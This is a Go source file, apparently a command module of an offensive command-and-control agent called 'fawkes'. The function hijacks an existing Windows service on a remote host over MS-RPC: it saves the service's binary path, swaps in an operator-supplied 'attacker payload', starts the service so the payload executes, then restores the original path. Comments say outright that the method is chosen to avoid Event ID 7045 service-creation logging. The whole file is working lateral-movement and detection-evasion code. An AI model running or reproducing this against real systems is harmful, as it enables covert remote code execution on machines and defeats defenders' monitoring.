package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	svcctl "github.com/oiweiwei/go-msrpc/msrpc/scmr/svcctl/v2"
)

// SERVICE_NO_CHANGE indicates that a ChangeServiceConfigW field should not be modified.
const svcNoChange = 0xFFFFFFFF

// remoteSvcModifyPath hijacks an existing service by swapping its binary path,
// starting it, then restoring the original path. This is a stealthier alternative
// to creating a new service (avoids Event ID 7045 for service creation).
func remoteSvcModifyPath(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for modify-path action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for modify-path action (the attacker payload path)")
	}

	cli, scm, ctx, cancel, cleanup, err := remoteSvcConnect(args, scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer cancel()
	defer cleanup()
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	// Open the target service with change config + start + query + stop access
	svcResp, err := cli.OpenServiceW(ctx, &svcctl.OpenServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DesiredAccess:  svcChangeConfig | svcStart | svcStop | svcQueryConfig | svcQueryStatus,
	})
	if err != nil {
		return errorf("Failed to open service %q: %v", args.Name, err)
	}
	if svcResp.Return != 0 {
		return errorf("OpenServiceW error for %q: 0x%08x", args.Name, svcResp.Return)
	}
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: svcResp.Service}) }()

	// Query current config to save original binary path
	cfgResp, err := cli.QueryServiceConfigW(ctx, &svcctl.QueryServiceConfigWRequest{
		Service:      svcResp.Service,
		BufferLength: 8192,
	})
	if err != nil {
		return errorf("QueryServiceConfigW failed: %v", err)
	}

	originalBinPath := cfgResp.ServiceConfig.BinaryPathName
	originalStartType := cfgResp.ServiceConfig.StartType

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== modify-path on %s:%s ===\n", args.Server, args.Name))
	sb.WriteString(fmt.Sprintf("Original BinPath : %s\n", originalBinPath))
	sb.WriteString(fmt.Sprintf("Payload BinPath  : %s\n", args.BinPath))

	// Step 1: Change binary path to attacker payload
	changeResp, err := cli.ChangeServiceConfigW(ctx, &svcctl.ChangeServiceConfigWRequest{
		Service:        svcResp.Service,
		ServiceType:    svcNoChange,
		StartType:      svcNoChange,
		ErrorControl:   svcNoChange,
		BinaryPathName: args.BinPath,
	})
	if err != nil {
		return errorf("ChangeServiceConfigW (set payload) failed: %v", err)
	}
	if changeResp.Return != 0 {
		return errorf("ChangeServiceConfigW (set payload) error: 0x%08x", changeResp.Return)
	}
	sb.WriteString("Step 1: Binary path swapped to payload\n")

	// Step 2: Start the service (executes attacker payload)
	startResp, err := cli.StartServiceW(ctx, &svcctl.StartServiceWRequest{
		Service: svcResp.Service,
	})
	startOK := err == nil && startResp.Return == 0
	if startOK {
		sb.WriteString("Step 2: Service started (payload executing)\n")
	} else {
		// Service may fail to start (payload crashes, exits quickly, etc.) — still restore
		startErr := ""
		if err != nil {
			startErr = err.Error()
		} else {
			startErr = fmt.Sprintf("0x%08x", startResp.Return)
		}
		sb.WriteString(fmt.Sprintf("Step 2: Start returned error (may still have executed): %s\n", startErr))
	}

	// Brief pause to let the payload execute before stopping
	time.Sleep(2 * time.Second)

	// Step 3: Stop the service (best-effort — payload may already have exited)
	ctrlResp, err := cli.ControlService(ctx, &svcctl.ControlServiceRequest{
		Service: svcResp.Service,
		Control: svcControlStop,
	})
	if err == nil && ctrlResp.Return == 0 {
		sb.WriteString("Step 3: Service stopped\n")
	} else {
		sb.WriteString("Step 3: Stop skipped (service already stopped or exited)\n")
	}

	// Step 4: Restore original binary path and start type
	restoreResp, err := cli.ChangeServiceConfigW(ctx, &svcctl.ChangeServiceConfigWRequest{
		Service:        svcResp.Service,
		ServiceType:    svcNoChange,
		StartType:      originalStartType,
		ErrorControl:   svcNoChange,
		BinaryPathName: originalBinPath,
	})
	if err != nil || restoreResp.Return != 0 {
		errMsg := ""
		if err != nil {
			errMsg = err.Error()
		} else {
			errMsg = fmt.Sprintf("0x%08x", restoreResp.Return)
		}
		sb.WriteString(fmt.Sprintf("WARNING: Failed to restore original BinPath: %s\n", errMsg))
		sb.WriteString("Manual cleanup required!\n")
	} else {
		sb.WriteString("Step 4: Original binary path restored\n")
	}

	sb.WriteString("\nResult: Payload executed via service path hijack")
	return successResult(sb.String())
}
